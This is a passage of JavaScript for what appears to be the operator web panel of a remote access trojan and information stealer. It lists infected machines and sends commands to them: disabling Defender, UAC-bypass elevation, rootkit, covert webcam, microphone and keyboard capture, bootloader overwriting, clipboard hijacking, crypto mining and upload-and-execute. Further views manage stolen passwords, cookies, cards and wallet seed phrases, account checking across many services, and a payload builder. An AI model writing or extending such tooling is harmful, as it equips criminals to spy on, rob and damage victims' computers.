      const tr = el('tr', { className: 'client-row' });
      tr.dataset.host = (c.hostname || '').toLowerCase();
      tr.appendChild(el('td', { className: 'td-check' }, [el('input', { type: 'checkbox' })]));
      const statusTd = el('td');
      const bar = el('div', { style: 'display:inline-flex;align-items:flex-end;gap:2px;height:12px' });
      [3,6,9,5].forEach(h => bar.appendChild(el('span', { style: `width:3px;height:${h}px;background:var(--ok);border-radius:1px` })));
      statusTd.appendChild(bar);
      tr.appendChild(statusTd);
      tr.appendChild(el('td', {}, [c.firstSeen || '—']));
      tr.appendChild(el('td', {}, [c.ip || '—']));
      tr.appendChild(el('td', {}, [c.tag || 'Guest']));
      tr.appendChild(el('td', {}, [c.note || '—']));
      tr.appendChild(el('td', {}, [c.user || '—']));
      tr.appendChild(el('td', {}, [c.hostname || '—']));
      tr.appendChild(el('td', {}, [c.activeWindow || '—']));
      tr.appendChild(el('td', {}, ['N/A']));
      tr.appendChild(el('td', {}, [c.os || 'Windows']));
      tr.onclick = (e) => { if (e.target.tagName === 'INPUT') return; openClientMenu(e, c); };
      tbody.appendChild(tr);
    });
  }
  tbl.appendChild(tbody);
  wrap.appendChild(tbl);
  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, [fmt('rowsSelected', { x: clients.length, y: clients.length })]));
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, [t('rowsPerPage')]));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('span', {}, [fmt('pageOf', { x: 1, y: 1 })]));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);
  root.appendChild(wrap);
  if (selectedClientId) { root.innerHTML = ''; renderControl(root); }
}

function openClientMenu(e, c) {
  const sub = (label, items) => ({ label, sub: items });
  const item = (label, action) => ({ label, action });
  const menu = [
    sub('Client', [
      item('Elevate Privileges', () => sendCmdTo(c.id, 'elevate')),
      item('Disable Defender', () => sendCmdTo(c.id, 'disable_defender')),
      item('Rootkit', () => sendCmdTo(c.id, 'rootkit')),
      item('Reset Survival', () => sendCmdTo(c.id, 'reset_survival')),
      item('Note', () => sendCmdTo(c.id, 'note')),
      item('Update', () => sendCmdTo(c.id, 'update')),
      sub('Change Bridge', [
        item('ComputerDefaults', () => sendCmdTo(c.id, 'bridge_computerdefaults')),
        item('Fodhelper', () => sendCmdTo(c.id, 'bridge_fodhelper'))
      ]),
      item('Disconnect', () => sendCmdTo(c.id, 'disconnect')),
      item('Restart', () => sendCmdTo(c.id, 'restart')),
      { sep: true },
      item('Uninstall', () => sendCmdTo(c.id, 'uninstall')),
      item('Kill', () => sendCmdTo(c.id, 'kill'))
    ]),
    sub('User Interaction', [
      item('MessageBox', () => sendCmdTo(c.id, 'ui_msgbox')),
      item('TTS', () => sendCmdTo(c.id, 'ui_tts')),
      item('Notepad', () => sendCmdTo(c.id, 'ui_notepad')),
      item('Open Link', () => sendCmdTo(c.id, 'ui_open_link')),
      item('Remote Chat', () => sendCmdTo(c.id, 'ui_chat'))
    ]),
    sub('Management', [
      item('Clipboard Manager', () => sendCmdTo(c.id, 'mgmt_clipboard')),
      item('Edit Hosts', () => sendCmdTo(c.id, 'mgmt_hosts')),
      item('File Manager', () => sendCmdTo(c.id, 'mgmt_file')),
      item('Firewall Manager', () => sendCmdTo(c.id, 'mgmt_firewall')),
      item('Installed Programs', () => sendCmdTo(c.id, 'mgmt_programs')),
      item('Network Manager', () => sendCmdTo(c.id, 'mgmt_network')),
      item('Policy Manager', () => sendCmdTo(c.id, 'mgmt_policy')),
      item('Proxy', () => sendCmdTo(c.id, 'mgmt_proxy')),
      item('Registry Editor', () => sendCmdTo(c.id, 'mgmt_registry')),
      item('Service Manager', () => sendCmdTo(c.id, 'mgmt_service')),
      item('Startup Manager', () => sendCmdTo(c.id, 'mgmt_startup')),
      item('Task Manager', () => sendCmdTo(c.id, 'mgmt_task')),
      item('Task Scheduler', () => sendCmdTo(c.id, 'mgmt_scheduler')),
      item('Window Manager', () => sendCmdTo(c.id, 'mgmt_window'))
    ]),
    sub('Surveillance', [
      item('Remote Desktop', () => sendCmdTo(c.id, 'remote_desktop')),
      item('Remote Camera', () => sendCmdTo(c.id, 'remote_camera')),
      item('Remote Microphone', () => sendCmdTo(c.id, 'remote_mic')),
      item('Remote Audio', () => sendCmdTo(c.id, 'remote_audio')),
      item('Keyboard', () => sendCmdTo(c.id, 'keyboard')),
      item('Remote Shell', () => sendCmdTo(c.id, 'remote_shell')),
      item('Hidden Desktop', () => sendCmdTo(c.id, 'hidden_desktop')),
      item('Hidden Display', () => sendCmdTo(c.id, 'hidden_display')),
      item('Recovery', () => sendCmdTo(c.id, 'recovery')),
      item('Cryptocurrency Injection', () => sendCmdTo(c.id, 'crypto_inject'))
    ]),
    sub('Miscellaneous', [
      sub('Upload and Execute', [
        item('From Disk', () => sendCmdTo(c.id, 'upload_disk')),
        item('From File Store', () => sendCmdTo(c.id, 'upload_filestore')),
        item('From Link', () => sendCmdTo(c.id, 'upload_link'))
      ]),
      item('Change Desktop Wallpaper', () => sendCmdTo(c.id, 'wallpaper')),
      item('Privacy Screen', () => sendCmdTo(c.id, 'privacy_screen')),
      item('Scripting', () => sendCmdTo(c.id, 'scripting'))
    ]),
    sub('System', [
      item('Information', () => sendCmdTo(c.id, 'sys_info')),
      sub('Power', [item('Off', () => sendCmdTo(c.id, 'power_off')), item('Restart', () => sendCmdTo(c.id, 'power_restart'))]),
      sub('Remove System', [item('Corrupt Registry', () => sendCmdTo(c.id, 'remove_registry')), item('Overwrite Bootloader', () => sendCmdTo(c.id, 'remove_bootloader'))])
    ]),
    { sep: true },
    sub('Clipper', [item('Start', () => sendCmdTo(c.id, 'clipper_start'))]),
    sub('Web Injection', [item('Start', () => sendCmdTo(c.id, 'webinject_start'))]),
    sub('Miner', [item('Start', () => sendCmdTo(c.id, 'miner_start'))]),
    sub('Plugin System', [item('Clear All Plugins', () => sendCmdTo(c.id, 'plugins_clear'))])
  ];
  showCtxMenu(e, menu);
}

function sendCmdTo(id, action, extra = {}) {
  socket.emit('operator:cmd', { targetId: id, cmd: { action, ...extra } });
  toast(t('sent') + ': ' + action);
  addNotification(t('command'), action);
}
function sendCmd(action, extra = {}) {
  if (!selectedClientId) return toast(t('selectClient'));
  sendCmdTo(selectedClientId, action, extra);
}

function renderControl(root) {
  const c = clients.find(x => x.id === selectedClientId);
  const header = el('div', { className: 'toolbar' });
  const back = el('button', { className: 'btn' }, ['← Back']);
  back.onclick = () => { selectedClientId = null; loadView('clients'); };
  header.appendChild(back);
  header.appendChild(el('span', { style: 'color:var(--text-dim);font-size:0.85rem' }, [
    (c?.hostname || selectedClientId) + ' — ' + (c?.ip || '')
  ]));
  root.appendChild(header);
  const panel = el('div', { className: 'control-panel' });
  panel.appendChild(el('div', { className: 'screen-container' }, [el('img', { id: 'screen', src: '', alt: '' })]));
  const side = el('div', { className: 'control-side' });
  [
    ['Screenshot','screenshot'],['Remote Desktop','remote_desktop'],
    ['Hidden Desktop','hidden_desktop'],['Visible Desktop','visible_desktop'],
    ['Remote Camera','remote_camera'],['Remote Mic','remote_mic'],
    ['Keyboard','keyboard'],['Remote Shell','remote_shell'],
    ['Show Fake Update','show_overlay'],['Hide Fake Update','hide_overlay'],
    ['File Manager','file_manager'],['Crypto Injection','crypto_inject']
  ].forEach(([label, action]) => {
    const b = el('button', {}, [label]);
    b.onclick = () => sendCmd(action);
    side.appendChild(b);
  });
  panel.appendChild(side);
  root.appendChild(panel);
}

socket.on('frame', ({ id, data }) => {
  if (id !== selectedClientId) return;
  const img = document.getElementById('screen');
  if (img) img.src = 'data:image/jpeg;base64,' + data;
});

/* ===== Collections ===== */
const collectionRerender = {};
async function loadCollection(view) {
  try {
    caches[view] = await api('/api/' + view);
    if (collectionRerender[view]) collectionRerender[view]();
  } catch { toast(t('loadFailed')); }
}

function collectionView(view, root, columns, opts = {}) {
  const render = () => {
    root.innerHTML = '';
    const c = caches[view] || [];
    if (opts.stats) {
      const row = el('div', { className: 'stat-row' });
      opts.stats(c).forEach(s => row.appendChild(statCard(s.labelKey, s.value, s.pill)));
      root.appendChild(row);
    }
    const search = searchBar(opts.searchKey || 'search', () => {});
    root.appendChild(search.bar);
    const bar = el('div', { className: 'toolbar' });
    if (opts.addLabelKey) {
      const add = el('button', { className: 'btn primary' }, [t(opts.addLabelKey)]);
      add.onclick = () => opts.onAdd?.();
      bar.appendChild(add);
    }
    const refresh = el('button', { className: 'btn' }, [t('refresh')]);
    refresh.onclick = () => loadCollection(view);
    bar.appendChild(refresh);
    bar.appendChild(el('div', { className: 'spacer' }));
    bar.appendChild(el('span', { style: 'color:var(--text-mute);font-size:0.8rem' }, [c.length + ' ' + t('entries')]));
    root.appendChild(bar);
    root.appendChild(dataTable(columns, c, {
      checkbox: true,
      emptyKey: opts.emptyKey || 'noData',
      onContext: (row) => [{ label: 'Delete', action: async () => { await api('/api/' + view + '/' + row.id, { method: 'DELETE' }); loadCollection(view); } }]
    }));
  };
  render();
  collectionRerender[view] = render;
}

function addRowModal(view, fields, titleKey) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [t(f.labelKey)]);
    let input;
    if (f.type === 'textarea') input = el('textarea');
    else if (f.type === 'select') { input = el('select'); f.options.forEach(o => input.appendChild(el('option', { value: o }, [o]))); }
    else input = el('input', { type: f.type || 'text', placeholder: t(f.phKey || '') });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, [t('cancel')]);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, [t('save')]);
  save.onclick = async () => {
    const body = {};
    nodes.forEach(label => { const i = label.querySelector('[data-field]'); if (i) body[i.dataset.field] = i.value; });
    await api('/api/' + view, { method: 'POST', body: JSON.stringify(body) });
    closeModal();
    loadCollection(view);
    toast(t('added'));
  };
  foot.appendChild(cancel); foot.appendChild(save);
  nodes.push(foot);
  openModal(t(titleKey), nodes);
}

function addRowModalInline(fields, titleKey, onSave) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [t(f.labelKey)]);
    const input = el('input', { type: f.type || 'text', placeholder: t(f.phKey || '') });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, [t('cancel')]);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, [t('save')]);
  save.onclick = () => {
    const body = {};
    nodes.forEach(label => { const i = label.querySelector('[data-field]'); if (i) body[i.dataset.field] = i.value; });
    onSave(body);
    closeModal();
  };
  foot.appendChild(cancel); foot.appendChild(save);
  nodes.push(foot);
  openModal(t(titleKey), nodes);
}

/* ===== Views ===== */
const views = {
  home: (root) => { root.appendChild(el('div', { className: 'empty' }, [t('pendingFeature')])); },
  dashboard: (root) => { root.appendChild(el('div', { className: 'empty' }, [t('pendingFeature')])); },
  clients: renderClients,

  recovery: (root) => {
    loadCollection('recovery');
    collectionView('recovery', root, [
      { labelKey: 'colReceived', render: r => esc(r.createdAt || '') },
      { labelKey: 'colIP', key: 'ip' }, { labelKey: 'colCountry', key: 'country' },
      { labelKey: 'colUser', key: 'user' }, { labelKey: 'colMachine', key: 'machine' },
      { labelKey: 'colOS', key: 'os' }, { labelKey: 'colTag', key: 'tag' },
      { labelKey: 'colContents', render: r => esc((r.contents || '').slice(0, 60)) }
    ], {
      searchKey: 'searchRecovery',
      stats: (c) => [
        { labelKey: 'totalLogs', value: c.length, pill: '0 | 0.0%' },
        { labelKey: 'cookies', value: 0, pill: '0 | 0.0%' },
        { labelKey: 'passwords', value: 0, pill: '0 | 0.0%' },
        { labelKey: 'cards', value: 0, pill: '0 | 0.0%' },
        { labelKey: 'applications', value: 0, pill: '0 | 0.0%' }
      ],
      addLabelKey: 'addLog',
      onAdd: () => addRowModal('recovery', [
        { key: 'ip', labelKey: 'colIP' }, { key: 'country', labelKey: 'colCountry' },
        { key: 'user', labelKey: 'colUser' }, { key: 'machine', labelKey: 'colMachine' },
        { key: 'os', labelKey: 'colOS' }, { key: 'tag', labelKey: 'colTag' },
        { key: 'contents', labelKey: 'colContents', type: 'textarea' }
      ], 'addLog')
    });
  },

  wallets: (root) => {
    loadCollection('wallets');
    collectionView('wallets', root, [
      { labelKey: 'colReceived', render: r => esc(r.createdAt || '') },
      { labelKey: 'colWallet', key: 'wallet' }, { labelKey: 'colPassword', key: 'password' },
      { labelKey: 'colMnemonic', render: r => esc((r.mnemonic || '').slice(0, 40)) },
      { labelKey: 'colIP', key: 'ip' }, { labelKey: 'colCountry', key: 'country' },
      { labelKey: 'colUser', key: 'user' }, { labelKey: 'colMachine', key: 'machine' }, { labelKey: 'colOS', key: 'os' }
    ], {
      searchKey: 'searchWallets',
      stats: (c) => [
        { labelKey: 'totalLogs', value: c.length, pill: '0.0%' },
        { labelKey: 'atomic', value: 0, pill: '0.0%' },
        { labelKey: 'exodus', value: 0, pill: '0.0%' },
        { labelKey: 'phantom', value: 0, pill: '0.0%' },
        { labelKey: 'metamask', value: 0, pill: '0.0%' },
        { labelKey: 'trustWallet', value: 0, pill: '0.0%' }
      ],
      addLabelKey: 'addWallet',
      onAdd: () => addRowModal('wallets', [
        { key: 'wallet', labelKey: 'colWallet' }, { key: 'password', labelKey: 'colPassword' },
        { key: 'mnemonic', labelKey: 'colMnemonic', type: 'textarea' },
        { key: 'ip', labelKey: 'colIP' }, { key: 'country', labelKey: 'colCountry' },
        { key: 'user', labelKey: 'colUser' }, { key: 'machine', labelKey: 'colMachine' },
        { key: 'os', labelKey: 'colOS' }
      ], 'addWallet')
    });
  },

  proxy: (root) => {
    loadCollection('proxy');
    collectionView('proxy', root, [
      { labelKey: 'colIP', key: 'ip' }, { labelKey: 'colCountry', key: 'country' },
      { labelKey: 'colUsername', key: 'username' }, { labelKey: 'colMachine', key: 'machine' },
      { labelKey: 'colStatus', key: 'status' }, { labelKey: 'colProxyHost', key: 'host' },
      { labelKey: 'colPort', key: 'port' }, { labelKey: 'colHwid', key: 'hwid' }
    ], {
      searchKey: 'searchProxies',
      stats: (c) => [
        { labelKey: 'onlineProxies', value: c.filter(p => p.status === 'Active').length, pill: 'Idle' },
        { labelKey: 'offlineProxies', value: c.filter(p => p.status !== 'Active').length, pill: 'None' },
        { labelKey: 'totalProxies', value: c.length, pill: 'Empty' },
        { labelKey: 'workers', value: 0, pill: 'No owners' }
      ],
      addLabelKey: 'addProxy',
      onAdd: () => addRowModal('proxy', [
        { key: 'ip', labelKey: 'colIP' }, { key: 'port', labelKey: 'colPort' },
        { key: 'country', labelKey: 'colCountry' }, { key: 'username', labelKey: 'colUsername' },
        { key: 'host', labelKey: 'colProxyHost' },
        { key: 'status', labelKey: 'colStatus', type: 'select', options: ['Idle','Active','Dead'] }
      ], 'addProxy')
    });
  },

  clipper: async (root) => {
    const cfg = await api('/api/clipper');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addEntry')]);
    add.onclick = () => addRowModalInline([
      { key: 'label', labelKey: 'colLabel' }, { key: 'find', labelKey: 'match' }, { key: 'replace', labelKey: 'replacement' }
    ], 'addClipperEntry', (body) => {
      cfg.entries.push({ id: Date.now().toString(36), ...body });
      api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) });
      views.clipper(root);
    });
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    const toggle = el('label', { className: 'switch' });
    const cb = el('input', { type: 'checkbox' });
    cb.checked = !!cfg.enabled;
    cb.onchange = () => { cfg.enabled = cb.checked; api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); };
    toggle.appendChild(cb); toggle.appendChild(el('span', { className: 'slider' }));
    bar.appendChild(toggle);
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ labelKey: 'colLabel', key: 'label' }, { labelKey: 'colMatch', key: 'find' }, { labelKey: 'colReplace', key: 'replace' }],
      cfg.entries, { checkbox: true, emptyKey: 'noClipperEntries' }
    ));
  },

  webinjection: (root) => {
    loadCollection('webinjection');
    collectionView('webinjection', root, [
      { labelKey: 'colRule', key: 'name' }, { labelKey: 'colUrlPattern', key: 'url' },
      { labelKey: 'colEnabled', render: r => r.enabled ? '✓' : '✗' },
      { labelKey: 'colReplacement', render: r => esc((r.replacement || '').slice(0, 40)) }
    ], {
      searchKey: 'searchRules',
      emptyKey: 'noRules',
      addLabelKey: 'addRule',
      onAdd: () => addRowModal('webinjection', [
        { key: 'name', labelKey: 'ruleName' }, { key: 'url', labelKey: 'urlPattern' },
        { key: 'original', labelKey: 'originalCode', type: 'textarea' },
        { key: 'replacement', labelKey: 'replacementCode', type: 'textarea' }
      ], 'addRule')
    });
  },

  sorter: (root) => {
    loadCollection('sorter');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addGroup')]);
    add.onclick = () => addRowModal('sorter', [
      { key: 'name', labelKey: 'groupName' },
      { key: 'type', labelKey: 'colType', type: 'select', options: ['Cookies','Passwords','Folders','Discord Tokens','Steam Tokens','Telegram Data'] },
      { key: 'filter', labelKey: 'colFilter' },
      { key: 'format', labelKey: 'colFormat', type: 'select', options: ['Netscape','JSON'] }
    ], 'addGroup');
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ labelKey: 'colName', key: 'name' }, { labelKey: 'colType', key: 'type' }, { labelKey: 'colFilter', key: 'filter' }, { labelKey: 'colFormat', key: 'format' }],
      caches.sorter, { checkbox: true, emptyKey: 'noSorter' }
    ));
  },

  autotasks: (root) => {
    loadCollection('autotasks');
    root.innerHTML = '';
    const row = el('div', { className: 'stat-row' });
    row.appendChild(statCard('totalTasks', caches.autotasks.length, 'Empty'));
    row.appendChild(statCard('active', 0, 'Idle'));
    row.appendChild(statCard('onceTasks', 0, 'None'));
    row.appendChild(statCard('executions', 0, 'No runs'));
    root.appendChild(row);
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addTask')]);
    add.onclick = () => addRowModal('autotasks', [
      { key: 'name', labelKey: 'taskName' },
      { key: 'type', labelKey: 'colType', type: 'select', options: ['Recovery','Cryptocurrency Injection','Miner','Clipper','Web Injection','Upload and Execute','Disable Defender','Elevate','Rootkit'] },
      { key: 'mode', labelKey: 'colMode', type: 'select', options: ['Every connect','Once','Delay'] }
    ], 'addTask');
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    const chain = el('div', { className: 'chain' });
    const trigger = el('div', { className: 'chain-node' });
    trigger.style.left = '60px'; trigger.style.top = '90px';
    trigger.appendChild(el('div', { className: 'cn-title' }, [t('trigger')]));
    trigger.appendChild(el('div', { className: 'cn-sub' }, [t('onConnect')]));
    trigger.appendChild(el('div', { className: 'cn-sub' }, [fmt('inChain', { x: caches.autotasks.length })]));
    chain.appendChild(trigger);
    root.appendChild(chain);
    root.appendChild(dataTable(
      [
        { labelKey: 'colName', key: 'name' }, { labelKey: 'colType', key: 'type' }, { labelKey: 'colMode', key: 'mode' },
        { labelKey: 'colStatus', render: () => `<span style="color:var(--ok)">${t('enabled')}</span>` },
        { labelKey: 'colDetail', render: () => '—' }, { labelKey: 'colFired', render: () => '—' }
      ],
      caches.autotasks, { checkbox: true, emptyKey: 'noTasks' }
    ));
  },

  filestore: (root) => {
    loadCollection('filestore');
    collectionView('filestore', root, [
      { labelKey: 'colName', key: 'name' }, { labelKey: 'colSize', key: 'size' },
      { labelKey: 'colUploaded', render: r => esc(r.createdAt || '') }
    ], {
      searchKey: 'searchFiles',
      emptyKey: 'noFiles',
      stats: (c) => [
        { labelKey: 'totalFiles', value: c.length, pill: 'Empty' },
        { labelKey: 'totalSize', value: c.reduce((a, x) => a + (parseInt(x.size) || 0), 0) + ' B', pill: 'No files' },
        { labelKey: 'recent', value: 0, pill: 'None' }
      ],
      addLabelKey: 'upload',
      onAdd: () => addRowModal('filestore', [
        { key: 'name', labelKey: 'colName' }, { key: 'size', labelKey: 'colSize' }
      ], 'upload')
    });
  },

  miner: async (root) => {
    const m = await api('/api/miner');
    root.innerHTML = '';
    const row = el('div', { className: 'stat-row' });
    [
      ['activeMiners', m.stats.active, '0%'],
      ['totalHashrate', m.stats.hashrate + ' H/s', 'No miners'],
      ['cpuHashrate', '0 H/s', 'Idle'],
      ['gpuHashrate', '0 H/s', 'Idle'],
      ['accepted', m.stats.accepted, 'No shares'],
      ['rejected', m.stats.rejected, 'Clean'],
      ['totalRuntime', '0s', 'Idle']
    ].forEach(([k, v, p]) => row.appendChild(statCard(k, v, p)));
    root.appendChild(row);
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, [t('addJob')]);
    add.onclick = () => addRowModalInline([
      { key: 'name', labelKey: 'jobName' }, { key: 'pool', labelKey: 'pool' }, { key: 'wallet', labelKey: 'wallet' }
    ], 'addJob', (body) => {
      m.jobs.push({ id: Date.now().toString(36), ...body });
      api('/api/miner', { method: 'POST', body: JSON.stringify(m) });
      views.miner(root);
    });
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);
    root.appendChild(dataTable(
      [{ labelKey: 'colJobName', key: 'name' }, { labelKey: 'colPool', key: 'pool' }, { labelKey: 'colWalletCol', key: 'wallet' }, { labelKey: 'colStatus', render: () => 'Idle' }],
      m.jobs, { checkbox: true, emptyKey: 'noMiningJobs' }
    ));
  },

  checker: (root) => {
    root.innerHTML = '';
    const cats = ['All','Games','Emails','Socials','Marketplaces','Crypto','AI','Streaming','Other'];
    const catBar = el('div', { className: 'checker-cats' });
    cats.forEach((cat, i) => {
      const b = el('button', { className: i === 0 ? 'active' : '' }, [cat]);
      b.onclick = () => { catBar.querySelectorAll('button').forEach(x => x.classList.remove('active')); b.classList.add('active'); };
      catBar.appendChild(b);
    });
    root.appendChild(catBar);
    const search = searchBar('search', () => {});
    root.appendChild(search.bar);
    const services = [
      ['Amazon','Email, Country, Balance, Orders','#ff9900'],['AOL Mail','Username, Email, Phone, Country','#0060a9'],
      ['Avito','Email, Phone, Name, Balance','#00a1ff'],['BattleNet','Email, Balance, Transactions','#148eff'],
      ['Binance','ID, Email, Country, Balance','#f0b90b'],['Booking','Email, Country, Level, Payments','#003580'],
      ['Bybit','ID, Email, Country, Balance','#f7a600'],['ChatGPT','Email, Name, Plan, 2FA','#10a37f'],
      ['Claude','Email, Plan, Billing, Expires At','#d97757'],['Coinbase','Email, Country, Balance, 2FA','#1652f0'],
      ['Cursor','Email, Name, Plan, Usage','#111827'],['Discord','Username, Email, Nitro, Guilds','#5865f2'],
      ['Dropbox','Email, Name, Plan, Storage Used','#0061ff'],['EA','Username, Email, Country, Created At','#ff4747'],
      ['eBay','Username, Country, Orders, Feedback','#e53238'],['EFT','Username, Email, Owned, Banned','#111'],
      ['Epic Games','Username, Email, Country, V-Bucks, Skins','#2a2a2a'],['EXBO','Username, Email, Game, Inventory','#1e3a8a'],
      ['ExitLag','Email, Plan, Status','#d42028'],['Facebook','Name, Friends, Verified, Business, Country, Locale','#1877f2'],
      ['FreeBitco.in','Email, BTC Address, Balance, 2FA','#f7931a'],['FunPay','Username, Balance, Sales, Purchases','#ffce3d'],
      ['GitHub','Username, Email, Followers, Plan','#111827'],['GOG.com','Username, Email, Balance, Games','#7b2eda'],
      ['Google','Name, Email, Country, 2FA','#4285f4'],['Grok','Name, Email, Plan, Subscription','#111827'],
      ['Humble Bundle','Email, Country, Balance, Orders','#d63030'],['Hytale','Username, Email, Purchased, Edition','#3b82f6'],
      ['iCloud','Email, Name, Plan, Storage','#3693f3'],['Instagram','Username, Email, Followers, Verified','#e4405f'],
      ['Kick','Username, Email, Followers, Verified','#53fc18'],['Kleinanzeigen','Username, Email, City, Listings','#111'],
      ['LinkedIn','Username, Email, Connections, Premium','#0a66c2'],['Loaded','Name, Email, Country, Orders','#7c3aed'],
      ['MEXC','Email, Country, KYC, Balance','#00c9a7'],['miHoYo','Username, Email, Country, Games','#5c9ee8'],
      ['Minecraft','Username, Email, Owned, Minecoins','#62b47a'],['Netflix','Name, Email, Country, Plan','#e50914'],
      ['Nintendo','Email, Country, Balance, Orders','#e60012'],['Onet','Email, Country, Phone, Quota','#ffcc00'],
      ['Outlook','Name, Email, Country, Inbox','#0078d4'],['PayPal','Email, Country, Balance, Cards','#003087'],
      ['Playerok','Username, Email, Balance, Sales','#2563eb'],['Reddit','Username, Karma, Premium, Verified','#ff4500'],
      ['Riot Games','Username, Email, Country, 2FA','#d13639'],['Roblox','Username, Email, Country, Robux, Premium','#00a2ff'],
      ['Rockstar Games','Username, Email, Games','#f8b700'],['Seznam','Email, Name, Phone, Country','#cc0000']
    ];
    const grid = el('div', { className: 'checker-grid' });
    services.forEach(([name, desc, color]) => {
      const card = el('div', { className: 'checker-card' });
      const head = el('div', { className: 'cc-head' });
      head.appendChild(el('div', { className: 'cc-logo', style: `background:${color}` }, [name[0]]));
      const open = el('button', { className: 'btn icon' });
      open.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 4h6v6M20 4l-9 9M5 5h5M5 19h14V10"/></svg>';
      head.appendChild(open);
      card.appendChild(head);
      card.appendChild(el('div', { className: 'cc-name' }, [name]));
      card.appendChild(el('div', { className: 'cc-desc' }, [desc]));
      const foot = el('div', { className: 'cc-foot' });
      const settings = el('button', { className: 'cc-settings' }, ['⚙ ' + t('settings')]);
      settings.onclick = () => toast(name);
      foot.appendChild(settings);
      const sw = el('label', { className: 'switch' });
      sw.appendChild(el('input', { type: 'checkbox' }));
      sw.appendChild(el('span', { className: 'slider' }));
      foot.appendChild(sw);
      card.appendChild(foot);
      grid.appendChild(card);
    });
    root.appendChild(grid);
  },

  checkersessions: (root) => {
    loadCollection('checkersessions');
    collectionView('checkersessions', root, [
      { labelKey: 'colService', key: 'service' },
      { labelKey: 'colCombo', render: r => esc((r.combo || '').slice(0, 50)) },
      { labelKey: 'colStatusSession', key: 'status' },
      { labelKey: 'colChecked', render: r => esc(r.createdAt || '') }
    ], {
      searchKey: 'searchSessions',
      emptyKey: 'noSessions',
      addLabelKey: 'addSession',
      onAdd: () => addRowModal('checkersessions', [
        { key: 'service', labelKey: 'service' }, { key: 'combo', labelKey: 'combo' },
        { key: 'status', labelKey: 'status', type: 'select', options: ['Valid','Invalid','2FA','Locked'] }
      ], 'addSession')
    });
  },

  builder: async (root) => {
    const b = await api('/api/builder');
    root.innerHTML = '';
    const save = () => api('/api/builder', { method: 'POST', body: JSON.stringify(b) });
    function sec(titleKey, rows) {
      const box = el('div', { className: 'sec' });
      box.appendChild(el('div', { className: 'sec-title' }, [t(titleKey)]));
      rows.forEach(row => {
        if (row.type === 'toggle') {
          const tr = el('div', { className: 'toggle-row' });
          const left = el('div');
          left.appendChild(el('div', { className: 'tr-label' }, [t(row.labelKey)]));
          tr.appendChild(left);
          const sw = el('label', { className: 'switch' });
          const cb = el('input', { type: 'checkbox' });
          const path = row.path.split('.');
          let val = b; path.forEach(p => val = val?.[p]);
          cb.checked = !!val;
          cb.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = cb.checked;
            save();
          };
          sw.appendChild(cb); sw.appendChild(el('span', { className: 'slider' }));
          tr.appendChild(sw);
          box.appendChild(tr);
        } else {
          const fr = el('div', { className: 'form-row' });
          fr.appendChild(el('label', {}, [t(row.labelKey)]));
          const path = row.path.split('.');
          let val = b; path.forEach(p => val = val?.[p]);
          const input = el('input', { value: val ?? '' });
          input.onchange = () => {
            let obj = b;
            for (let i = 0; i < path.length - 1; i++) obj = obj[path[i]];
            obj[path[path.length - 1]] = input.value;
            save();
          };
          fr.appendChild(input);
          box.appendChild(fr);
        }
      });
      return box;
    }

    root.appendChild(sec('general', [
      { labelKey: 'clientTag', path: 'clientTag' },
      { labelKey: 'note', path: 'note' },
      { labelKey: 'mutex', path: 'mutex' }
    ]));
    root.appendChild(sec('options', [
      { labelKey: 'defenderExclusion', path: 'defenderExclusion', type: 'toggle' },
      { labelKey: 'forceAdmin', path: 'forceAdmin', type: 'toggle' },
      { labelKey: 'debug', path: 'debug', type: 'toggle' }
    ]));
    root.appendChild(sec('install', [
      { labelKey: 'enabled', path: 'install.enabled', type: 'toggle' },
      { labelKey: 'location', path: 'install.location' },
      { labelKey: 'folder', path: 'install.folder' },
      { labelKey: 'filename', path: 'install.filename' },
      { labelKey: 'registry', path: 'install.registry', type: 'toggle' }
    ]));

    const finalSec = el('div', { className: 'sec' });
    finalSec.appendChild(el('div', { className: 'sec-title' }, [t('final')]));
    const cr = el('div', { className: 'form-row' });
    cr.appendChild(el('label', {}, ['Client']));
    const sel = el('select');
    ['exe','dll','py','ps1'].forEach(o => sel.appendChild(el('option', { value: o }, [o])));
    sel.value = b.final.client;
    sel.onchange = () => { b.final.client = sel.value; save(); };
    cr.appendChild(sel);
    finalSec.appendChild(cr);
    const buildBtn = el('button', { className: 'btn primary', style: 'width:100%;padding:0.75rem' }, [t('buildClient')]);
    buildBtn.onclick = async () => {
      const build = await api('/api/builder/build', { method: 'POST', body: '{}' });
      toast(t('buildCreated') + ': ' + build.name);
      addNotification(t('clientBuilder'), t('buildCreated'));
      views.builder(root);
    };
    finalSec.appendChild(buildBtn);
